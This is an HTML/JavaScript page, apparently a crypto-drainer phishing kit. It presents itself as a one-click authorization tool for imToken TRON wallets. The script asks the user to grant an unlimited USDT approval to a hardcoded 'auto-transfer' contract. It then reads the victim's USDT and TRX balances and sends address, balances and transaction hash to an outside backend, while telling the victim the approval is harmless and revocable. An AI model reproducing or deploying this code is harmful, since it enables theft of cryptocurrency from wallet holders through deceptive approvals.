<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>IMToken一键无限授权</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
           padding: 20px; max-width: 500px; margin: 0 auto; background: #f5f5f5; }
    .header { text-align: center; margin-bottom: 30px; }
    .header h1 { font-size: 22px; color: #2c3e50; margin-bottom: 10px; }
    .warning { background: #fff8e1; color: #e6a23c; padding: 12px; border-radius: 8px; 
               font-size: 14px; margin-bottom: 20px; text-align: left; }
    .btn { width: 100%; padding: 15px; font-size: 16px; border: none; border-radius: 8px; 
           background: #409EFF; color: white; cursor: pointer; margin-bottom: 15px; }
    .btn:disabled { background: #ccc; cursor: not-allowed; }
    #userInfo { text-align: center; font-size: 14px; color: #333; margin: 20px 0; padding: 15px; background: #fff; border-radius: 8px; }
    .record-list { margin-top: 30px; }
    .record-item { background: #fff; padding: 15px; margin-bottom: 15px; border-radius: 8px; font-size: 14px; }
    .record-item p { margin-bottom: 8px; color: #333; }
    .record-item p strong { color: #2c3e50; }
    .tx-link { color: #409EFF; text-decoration: none; }

    /* 外部浏览器提示弹窗样式 */
    .external-tip { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 999; display: flex; align-items: center; justify-content: center; }
    .tip-content { background: white; padding: 25px; border-radius: 12px; max-width: 85%; }
    .tip-content h2 { font-size: 18px; margin-bottom: 15px; color: #2c3e50; }
    .tip-content p { font-size: 14px; color: #666; margin-bottom: 20px; line-height: 1.5; }
    .tip-btn-group { display: flex; gap: 10px; }
    .tip-btn { flex: 1; padding: 12px; font-size: 14px; border-radius: 8px; border: none; cursor: pointer; }
    .tip-btn.primary { background: #409EFF; color: white; }
    .tip-btn.secondary { background: #f5f5f5; color: #333; }
  </style>
</head>
<body>
  <!-- 外部浏览器提示弹窗（默认隐藏） -->
  <div class="external-tip" id="externalTip" style="display: none;">
    <div class="tip-content">
      <h2>请用IMToken打开此页面</h2>
      <p>当前是外部浏览器，无法连接钱包，请点击“唤起IMToken”，或复制链接到IMToken内置浏览器打开。</p>
      <div class="tip-btn-group">
        <button class="tip-btn primary" id="openIMTokenBtn">唤起IMToken</button>
        <button class="tip-btn secondary" id="copyLinkBtn">复制链接</button>
      </div>
    </div>
  </div>

  <!-- 主内容区（IMToken内置浏览器显示） -->
  <div id="mainContent">
    <div class="header">
      <h1>TRC20代币一键无限授权</h1>
      <div class="warning">
        ⚠️ 本次授权为无限额度（可在IMToken钱包中随时撤销授权）
      </div>
    </div>

    <button id="connectBtn" class="btn">连接IMToken钱包</button>
    <button id="approveBtn" class="btn" disabled>一键授权（无限额度）</button>

    <div id="userInfo">未连接钱包</div>

    <div class="record-list">
      <h3 style="font-size: 16px; margin-bottom: 15px; color: #2c3e50;">授权记录</h3>
      <div id="approvalRecords">暂无授权记录</div>
    </div>
  </div>

  <script src="https://unpkg.com/tronweb@4.7.0/dist/TronWeb.min.js"></script>
  <script>
    // ========== 配置项 ==========
    const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa";
    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval";
    const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
    const CURRENT_PAGE_URL = window.location.href; // 当前页面链接（用于唤起/复制）

    // 全局变量
    let tronWeb, userAddress, trc20Contract;
    const RECORD_KEY = "imtoken_infinite_approval_records";

    // 页面加载：先检测是否是IMToken内置浏览器
    window.onload = () => {
      // 1. 判断是否是IMToken内置浏览器
      const isIMToken = /IMToken/i.test(navigator.userAgent);
      if (!isIMToken) {
        // 外部浏览器：显示提示弹窗，隐藏主内容
        document.getElementById("externalTip").style.display = "flex";
        document.getElementById("mainContent").style.display = "none";
        // 绑定外部浏览器的按钮事件
        bindExternalTipEvents();
        return;
      }

      // 2. 是IMToken内置浏览器：执行原逻辑
      const connectBtn = document.getElementById("connectBtn");
      const approveBtn = document.getElementById("approveBtn");
      renderApprovalRecords();

      // 延迟检测tronWeb（适配IMToken注入延迟）
      const checkIMToken = setInterval(() => {
        if (window.tronWeb && window.tronWeb.ready) {
          clearInterval(checkIMToken);
          tronWeb = window.tronWeb;
          initWallet().catch(err => {
            document.getElementById("userInfo").innerHTML = "连接钱包失败：" + err.message;
          });
        }
      }, 500);
      setTimeout(() => clearInterval(checkIMToken), 5000);

      // 连接钱包按钮
      connectBtn.onclick = async () => {
        try {
          const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
          userAddress = accounts[0];
          await initWallet();
        } catch (e) {
          alert("连接失败：" + e.message);
        }
      };

      // 一键授权按钮
      approveBtn.onclick = async () => {
        try {
          const result = await trc20Contract.approve(
            AUTO_TRANSFER_CONTRACT, 
            INFINITE_APPROVE_AMOUNT
          ).send({
            from: userAddress,
            shouldPollResponse: true
          });

          const [tokenBalance, trxBalance] = await Promise.all([
            getTokenBalance(userAddress),
            getTrxBalance(userAddress)
          ]);
          const record = {
            address: userAddress,
            tokenBalance: tokenBalance.toFixed(2),
            trxBalance: trxBalance.toFixed(2),
            approveTime: new Date().toLocaleString(),
            txHash: result.transaction.txID,
            approveType: "无限额度"
          };

          saveApprovalRecord(record);
          await sendDataToBackend(record);
          alert(`无限授权成功！\n交易哈希：${record.txHash}\n可在IMToken中撤销授权`);
          renderApprovalRecords();
        } catch (e) {
          alert("授权失败：" + e.message);
        }
      };
    };

    // ========== 外部浏览器提示弹窗的事件绑定 ==========
    function bindExternalTipEvents() {
      // 1. 唤起IMToken（用IMToken的URL Scheme）
      document.getElementById("openIMTokenBtn").onclick = () => {
        // IMToken的唤起协议：imtoken://browser?url=页面链接
        const imtokenUrl = imtoken://browser?url=${encodeURIComponent(CURRENT_PAGE_URL)};
        window.location.href = imtokenUrl;
      };

      // 2. 复制当前页面链接
      document.getElementById("copyLinkBtn").onclick = async () => {
        try {
          await navigator.clipboard.writeText(CURRENT_PAGE_URL);
          alert("链接已复制，请打开IMToken→发现→浏览器，粘贴链接访问");
        } catch (e) {
          alert("复制失败，请手动复制地址栏链接");
        }
      };
    }

    // ========== 原有工具函数（不变） ==========
    async function initWallet() {
      try {
        userAddress = tronWeb.defaultAddress.base58;
        trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
        document.getElementById("userInfo").innerHTML = `
          已连接：<br>
          ${userAddress.slice(0, 8)}...${userAddress.slice(-6)}
        `;
        document.getElementById("approveBtn").disabled = false;
      } catch (e) {
        throw new Error(e.message);
      }
    }

    async function getTokenBalance(address) {
      const balance = await trc20Contract.balanceOf(address).call();
      return balance / 1000000;
    }

    async function getTrxBalance(address) {
      const balance = await tronWeb.trx.getBalance(address);
      return balance / 1000000;
    }

    function saveApprovalRecord(record) {
      const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
      const newRecords = existing.filter(item => item.address !== record.address);
      newRecords.push(record);
      localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
    }

    function renderApprovalRecords() {
      const container = document.getElementById("approvalRecords");
      const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");container.innerHTML = records.length === 0 
        ? "<div class='record-item'>暂无授权记录</div>" 
        : records.map(record => `
            <div class="record-item">
              <p><strong>地址：</strong>${record.address.slice(0, 8)}...${record.address.slice(-6)}</p>
              <p><strong>授权类型：</strong>${record.approveType}</p>
              <p><strong>USDT：</strong>${record.tokenBalance} USDT</p>
              <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
              <p><strong>时间：</strong>${record.approveTime}</p>
              <p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易</a></p>
            </div>
          `).join("");
    }

    async function sendDataToBackend(record) {
      try {
        const res = await fetch(BACKEND_API, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(record),
          credentials: "omit"
        });
        if (!res.ok) throw new Error("后端请求失败");
        return res.json();
      } catch (e) {
        alert("授权成功，但通知发送失败：" + e.message);
        throw e;
      }
    }
  </script>
</body>
</html>
